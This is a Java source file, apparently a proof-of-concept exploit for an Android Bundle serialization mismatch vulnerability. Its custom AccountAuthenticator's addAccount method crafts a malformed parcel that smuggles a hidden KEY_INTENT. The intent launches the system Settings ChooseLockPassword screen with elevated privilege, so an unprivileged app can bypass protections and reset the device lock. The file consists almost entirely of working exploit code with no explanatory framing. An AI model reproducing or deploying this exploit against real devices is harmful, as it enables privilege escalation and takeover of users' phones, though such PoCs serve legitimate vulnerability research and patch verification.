package com.cve.poc201713286;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {

    private Context m_context = null;

    public MyAuthenticator(Context context) {
        super(context);
        m_context = context;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {

        Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();
        Log.e("yes","这里被执行了");
        pcelData.writeInt(3); // number of elements in ArrayMap
        /*****************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PACELABLE
        pcelData.writeString("android.hardware.camera2.params.OutputConfiguration"); // name of Class Loader
        pcelData.writeInt(1);//mRotation
        pcelData.writeInt(1);//mSurfaceGroupId
        pcelData.writeInt(1);//mSurfaceType
        pcelData.writeInt(1);//mConfiguredSize.getWidth()
        pcelData.writeInt(1);// mConfiguredSize.getHeight()
        pcelData.writeInt(1);// mIsDeferredConfig
        pcelData.writeInt(0);// mIsShared
        pcelData.writeInt(1);// ListLen`

        pcelData.writeInt(6);
        pcelData.writeInt(13);

        pcelData.writeInt(-1); // hold the length of Evil object
        int keyIntentStartPos = pcelData.dataPosition();  // hold the star position of Evil object
        // Evil object hide in ByteArray
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// name of Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri is null
        pcelData.writeString(null); // mType is null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage is null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos = pcelData.dataPosition(); // hold the end position of Evil object
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
        pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT
        pcelData.writeInt(lengthOfKeyIntent);
        pcelData.setDataPosition(keyIntentEndPos);

        ///////////////////////////////////////
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //

        int length  = pcelData.dataSize();
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        return evilBundle;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        return null;
    }
}
